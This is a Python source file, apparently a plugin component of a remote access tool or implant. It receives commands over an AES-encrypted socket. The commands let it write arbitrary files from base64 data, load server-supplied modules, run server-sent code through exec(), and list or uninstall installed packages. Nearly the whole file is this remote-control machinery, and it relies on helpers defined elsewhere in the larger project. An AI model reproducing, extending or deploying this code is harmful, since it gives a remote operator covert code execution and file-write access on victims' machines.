'''
REMOTE PLUGIN
VERSION V1.0.0
AUTHOR : ISSAC
'''

import importlib.util
import platform
import subprocess
import tempfile
import datetime
import sys
import os
import site
import base64
import io

class RemotePlugin:
    def __init__(self, sock) -> None:
        self.sock = sock
        self.plugins = {}
        self.tmp_dir = None
        self.unix_like = not 'windows' in platform.platform().lower() # DETECT OS

    def pip_installed(self):
        output = subprocess.check_output(['pip', 'freeze']).decode('utf-8')
        for line in output.splitlines():
            if not line:
                continue

            module = line.split('==')[0]
            ver = line.split('==')[1]

            for packages_dir in site.getsitepackages():
                loc = os.path.join(packages_dir, module)
                if not os.path.exists(loc):
                    continue

                date = datetime.datetime.fromtimestamp(os.stat(loc).st_ctime)

                info = {
                    'Name' : module,
                    'Type' : 'pip installed',
                    'Location' : loc,
                    'Version' : ver,
                    'Status' : 'Loaded',
                    'Date' : date,
                }

                self.plugins[module] = info

    def check_module(self, module_name) -> bool:
        try:
            output = subprocess.check_output(['pip', 'show', module_name]).decode('utf-8')
            if 'Location:' and f'Name: {module_name}' in output: # CHECK OUTPUT INFORMATION
                loc = ''
                ver = ''
                for line in output.split('\n'):
                    if 'Location:' in line:
                        loc = ':'.join(line.split(':')[1:]).strip()
                    elif 'Version:' in line:
                        ver = line.split(':')[1].strip()

                date = datetime.datetime.fromtimestamp(os.stat(loc).st_ctime)
                info = {
                    'Name' : module_name, # MODUEL NAME
                    'Type' : 'pip installed', # TYPE, pip INSTALLED
                    'Location' : loc, # MODULE INSTALL DIR
                    'Version' : ver, # MODULE VERSION
                    'Status' : 'Loaded', # STATUS
                    'Date' : date, # DATE OF INSTALLED
                }

                self.plugins[module_name] = info # ADD NEW MODULE INFORMATION INTO PLUGINS DICTIONARY

                return True
            else:
                return False
        except:
            return False
        
    def init_loader(self, tmp_dir):
        try:
            if self.tmp_dir == None: # INIT
                self.pip_installed()
                tmp_dir = tempfile.mkdtemp(dir=tempfile.gettempdir()) if tmp_dir == '' else tmp_dir
                if not os.path.exists(tmp_dir):
                    tmp_dir = tempfile.mkdtemp(dir=tempfile.gettempdir())
                self.tmp_dir = tmp_dir
                
                #LOAD EXISTS
                dir_list = list(os.scandir(self.tmp_dir))
                for _dir in dir_list:
                    if os.path.isdir(_dir):
                        try:
                            print(_dir.name, _dir.path)
                            self.load_module(_dir.name, 'X', self.tmp_dir, f'import {_dir.name}')
                            print(f'[+] loaded {_dir.name}')
                        except:
                            continue

            else: # REFRESH
                tmp_dir = self.tmp_dir
            return f'1|{b64EnStr(tmp_dir)}'
        except Exception as e:
            return f'0|{b64EnStr(str(e))}'

    '''
    LOAD MODULE
    --------------------------
    THIS SHOULD BE RUN AFTER MODULE IS INSTALLED BY SERVER.
    '''
    def load_module(self, module_name, version, module_dir, payload):
        try:
            if self.check_module(module_name):
                #return f'0|{b64EnStr("Module already installed by pip.")}'
                pass
            
            if os.path.exists(os.path.join(self.tmp_dir, module_name)):
                #return f'0|{b64EnStr("Module already installed by server.")}'
                pass
            
            module_path = os.path.join(module_dir, module_name, '__init__.py')
            spec = importlib.util.spec_from_file_location(module_name, module_path)
            module = importlib.util.module_from_spec(spec)
            sys.modules[spec.name] = module
            spec.loader.exec_module(module)
            exec(payload) # import xxx, from xxx import yyy, etc

            info = {
                'Name' : module_name, # MODULE NAME
                'Type' : 'Remote', # LOADED TYPE
                'Location' : module_path, # DIRECTORY
                'Version' : version, # MODULE VERSION
                'Status' : 'Loaded', # STATUS OF MODULE
                'Install Date' : datetime.datetime.now(), # DATE OF LOADED
            }

            self.plugins[module_name] = info

            return f'1|{b64EnStr(module_name)}'
        except Exception as e:
            raise e
            return f'0|{b64EnStr(str(e))}'
        
    # RELOAD MODULE
    def module_reload(self):
        pass

    # UPDATE MODULE
    def module_update(self):
        pass

    # LIST MODULE
    def list_loaded_module(self):
        payload = []
        for module in self.plugins.keys():
            m_dict = dict(self.plugins[module])
            l1 = ['%s\'%s' % (key, m_dict[key]) for key in list(m_dict.keys())]
            l1_str = '.'.join([b64EnStr(x) for x in l1])
            payload.append(f'{module},{l1_str}')

        payload = ','.join([b64EnStr(x) for x in payload])
        payload = f'1|{b64EnStr(payload)}'
        return payload

    # REMOVE MODULE
    def module_remove(self, module_name, plugin_type):
        module_dir = os.path.join(self.tmp_dir, module_name)
        try:
            if plugin_type == 'PIP':
                py_list = [
                    '',
                    'python',
                    'python3',
                ]
                pip_list = [
                    'pip',
                    'pip3',
                ]
                for py in py_list:
                    for pip in pip_list:
                        subprocess.check_output(args=[py, pip, 'uninstall', module_name])
            elif plugin_type == 'REMOTE':
                os.remove(module_dir)
            del self.plugins[module_name]
            return '1|'
        except Exception as e:
            return f'0|{b64EnStr(str(e))}'
        
    def write(self, file, b64_data):
        bytes_data = base64.b64decode(b64_data)
        try:
            with open(file, 'wb') as f:
                f.write(bytes_data)
            return f'1|{b64EnStr(file)}'
        except Exception as e:
            return f'1|{b64EnStr(str(e))}'

    def run(self):
        cmd = para[0]
        payload = ''
        if cmd == 'i': # INITIALIZATION
            payload = self.init_loader(base64.b64decode(para[1]).decode('utf-8'))
        elif cmd == 'l': # LOAD MODULE
            name = para[1] # MODULE NAME
            ver = para[2] # MODULE VERSION
            m_dir = para[3] # MODULE DIRECTORY
            p = para[4] #?? 'import' CODE, BUT MAYBE IT IS NOT NECESSARY SINCE IT WILL BE DONE IN PAYLOAD FILE?
            payload = self.load_module(name, ver, m_dir, p)
        elif cmd == 're':
            self.module_reload()
        elif cmd == 'ls': # LIST MODULE
            payload = self.list_loaded_module()
        elif cmd == 'r': # REMOVE MODULE
            name = para[1]
            plugin_type = para[2]
            payload = self.module_remove(name, plugin_type)
        elif cmd == 'w':
            file = para[1]
            b64_data = para[2]
            payload = self.write(file, b64_data)

        payload = f'rPlugin|{cmd}|{b64EnStr(payload)}'
        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))